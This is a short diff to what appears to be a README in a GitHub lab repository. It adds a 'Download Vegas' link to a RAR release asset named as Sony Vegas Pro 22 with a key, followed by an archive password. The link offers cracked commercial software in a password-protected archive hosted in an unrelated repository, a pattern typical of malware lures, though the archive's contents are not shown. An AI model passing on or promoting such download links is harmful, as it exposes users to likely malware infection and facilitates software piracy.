@@ -7,7 +7,7 @@
 
 
 
-* ## [Download Vegas]()
+* ## [Download Vegas](https://github.com/EymenBreh/dio-lab-open-source/releases/download/22.0.0.93/Sony.Vegas.Pro.22.0.0.93.+.Key.rar)
 * ## Archive PASS: LOAD12121
 
 
